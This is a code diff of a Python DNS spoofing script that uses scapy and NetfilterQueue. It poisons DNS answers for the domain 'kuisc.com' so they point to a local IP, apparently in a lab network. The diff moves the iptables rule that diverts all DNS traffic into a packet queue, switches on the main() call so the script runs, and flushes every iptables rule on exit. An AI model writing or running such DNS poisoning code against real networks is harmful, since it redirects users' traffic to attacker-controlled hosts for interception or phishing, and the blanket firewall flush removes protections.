@@ -3,14 +3,14 @@ from scapy.all import *
 import os
 
 domain = 'kuisc.com' # domain to be spoofed
-localIP = '10.0.2.4' # IP address for poisoned hosts.
+localIP = '192.168.56.8' # IP address for poisoned hosts.
 
-os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
+#os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 
 def callback(packet):
     payload = packet.get_payload()
     pkt = IP(payload)
-    
+
     if not pkt.haslayer(DNSQR):
         packet.accept()
     else:
@@ -25,6 +25,7 @@ def callback(packet):
             packet.accept()
 
 def main():
+    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
     q = NetfilterQueue()
     q.bind(1, callback)
     try:
@@ -34,4 +35,4 @@ def main():
         os.system('iptables -F')
         os.system('iptables -X')
 
-#main()
+main()
